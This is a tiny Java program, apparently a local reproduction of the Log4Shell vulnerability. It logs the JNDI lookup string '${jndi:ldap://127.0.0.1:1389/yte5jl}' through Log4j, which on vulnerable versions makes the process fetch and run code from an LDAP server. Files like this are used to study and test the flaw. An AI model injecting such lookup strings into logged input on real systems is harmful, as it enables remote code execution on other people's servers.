import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String password = "${jndi:ldap://127.0.0.1:1389/yte5jl}";
        Logger logger = LogManager.getLogger(Main.class);
        logger.error(password);
    }
}
